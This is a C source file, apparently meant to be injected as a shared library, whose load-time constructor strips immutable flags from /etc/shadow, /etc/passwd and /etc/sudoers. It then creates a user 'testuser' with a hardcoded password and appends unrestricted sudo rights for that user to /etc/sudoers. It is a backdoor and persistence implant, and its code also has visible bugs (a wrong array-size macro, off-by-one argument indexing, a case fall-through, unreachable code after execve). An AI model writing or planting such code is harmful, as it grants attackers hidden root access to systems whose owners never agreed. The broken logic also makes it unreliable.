#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <crypt.h>
#include <sys/wait.h>
#include <string.h>

#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))
#define DEFAULT_CHATTR_ARG_SIZE 4

void chattr_remove(char *files[])
{
	unsigned int size = ARRAY_SIZE(files);
	char *argv[DEFAULT_CHATTR_ARG_SIZE + size];
	memset(argv, 0, sizeof(argv));
	argv[0] = "/usr/bin/sudo";
	argv[1] = "/usr/bin/chattr";
	argv[2] = "-i";
	for (unsigned int i = 0; i < size; i++)
		argv[DEFAULT_CHATTR_ARG_SIZE - 1 + i] = files[i];
	argv[DEFAULT_CHATTR_ARG_SIZE + size] = NULL;
	char *envp[] = { NULL };
	execve(argv[0], argv, envp);
}

void chattr_add(char *files[])
{
	unsigned int size = ARRAY_SIZE(files);
	char *argv[DEFAULT_CHATTR_ARG_SIZE + size];
	memset(argv, 0, sizeof(argv));
	argv[0] = "/usr/bin/sudo";
	argv[1] = "/usr/bin/chattr";
	argv[2] = "+i";
	for (unsigned int i = 0; i < size; i++)
		argv[DEFAULT_CHATTR_ARG_SIZE - 1 + i] = files[i];
	argv[DEFAULT_CHATTR_ARG_SIZE + size] = NULL;
	char *envp[] = { NULL };
	execve(argv[0], argv, envp);
}

int __attribute__((constructor)) ctor() 
{
	char *files[] = { "/etc/shadow", "/etc/passwd", "/etc/sudoers", "/etc/init.d/shadow", "/tmp/shadow", "/tmp/user.so" };

	char *username = "testuser";
	char *password = "password";

	struct passwd *pw = getpwnam(username);
	if (!pw) {
		char *salt = "$6$random_salt$"; 		
		char *hashed_password = crypt(password, salt);
		if (!hashed_password) {
			return 0;
		}
		pid_t pid = fork();
		switch(pid) {
			case -1:
				return 0;
			case 0:
				chattr_remove(files);
			default:
				wait(NULL);
		}
		pid = fork();
		switch(pid) {
			case -1:
				return 0;
			case 0:
				char *argv[] = { "/usr/bin/sudo", "/usr/sbin/useradd", username, "-p", hashed_password, "-m", NULL };
				char *envp[] = { NULL };	
				execve(argv[0], argv, envp);
			default:
				wait(NULL);
		}
		char command[100] = { 0 };
		snprintf(command, sizeof(command), "echo '%s ALL=(ALL) ALL' >> /etc/sudoers", username);
		char *argv[] = { "/usr/bin/sudo", "/bin/bash", "-c", &command, NULL};
		char *envp[] = { NULL };
		execve(argv[0], argv, envp);
		chattr_add(files);
	} else {
		chattr_add(files);	
	}

    	return 0;
}

